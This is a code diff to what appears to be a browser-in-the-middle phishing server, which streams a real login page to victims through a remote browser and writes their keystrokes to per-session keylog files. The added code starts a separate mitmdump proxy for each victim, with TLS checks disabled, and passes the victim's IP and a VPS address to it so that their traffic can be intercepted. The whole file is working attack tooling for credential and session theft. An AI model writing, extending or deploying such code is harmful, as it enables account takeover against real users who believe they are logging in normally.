@@ -1,6 +1,7 @@
 import fs from 'fs'
 import path from 'path'
 const __dirname = path.resolve()
+import { spawn } from 'child_process'
 import got from 'got'
 import Fastify from 'fastify'
 import fastify_io from 'fastify-socket.io'
@@ -239,7 +240,7 @@ fastify.route({
   }
 })
 
-async function get_browser(target_page){
+async function get_browser(target_page, victim_ip){
   //use a frame buffer to mimic a screen. Headless browsers can't do WebRTC
   let xvfb = new Xvfb({
     silent: true,
@@ -256,7 +257,25 @@ async function get_browser(target_page){
     `--display=${xvfb._display}`
   ]
 
-  if(config.proxy !== undefined){
+  let proxy_proc = null
+  if(config.per_victim_proxy && victim_ip){
+    let proxy_port = Math.floor(Math.random() * (65535 - 49152 + 1)) + 49152
+    let mitm_args = [
+      '--listen-port', String(proxy_port),
+      '--ssl-insecure',
+      '-s', path.join(__dirname, 'mitm_addon.py'),
+      '--set', `victim_ip=${victim_ip}`,
+    ]
+    if(config.vps_ip){
+      mitm_args.push('--set', `vps_ip=${config.vps_ip}`)
+    }
+    proxy_proc = spawn('mitmdump', mitm_args, { stdio: 'ignore' })
+    proxy_proc.on('error', (err) => console.error('mitmdump error:', err))
+    //give mitmdump a moment to bind before chromium connects
+    await new Promise(resolve => setTimeout(resolve, 1200))
+    puppet_options.push(`--proxy-server=http://127.0.0.1:${proxy_port}`)
+    console.log(`per-victim proxy on :${proxy_port} for ${victim_ip}`)
+  } else if(config.proxy !== undefined){
     puppet_options.push("--proxy-server=" + config.proxy)
   }
   //set up a unique user data directory for this session so users don't stomp on each others' connections
@@ -284,6 +303,7 @@ async function get_browser(target_page){
   browser.victim_target_id = ''
   browser.controller_socket = ''
   browser.keylog = ''
+  browser.proxy_proc = proxy_proc
   browser.keylog_file = fs.createWriteStream(`./user_data/${browser_id}/keylog.txt`, {flags:'a'});
   browser.browser_id = browser_id
   browser.target_page = await browser.newPage()
@@ -306,6 +326,9 @@ async function get_browser(target_page){
   })
   browser.remove_instance = async function(){
     xvfb.stop((err)=>{if (err) console.error(err)})
+    if(browser.proxy_proc){
+      browser.proxy_proc.kill()
+    }
     browser.keylog_file.close()
     const index = browsers.indexOf(browser);
     await browser.close()
@@ -362,7 +385,7 @@ fastify.ready(async function(err){
       empty_phishbowl.controller_socket = socket.id
       fastify.io.to(empty_phishbowl.socket_id).emit('stream_video_to_first_viewer', socket.id)
       //console.log(empty_phishbowl)
-      empty_phishbowl = await get_browser(target.login_page)
+      empty_phishbowl = await get_browser(target.login_page, client_ip)
       browsers.push(empty_phishbowl)
     })
     socket.on('new_thumbnail', async function(thumbnail){
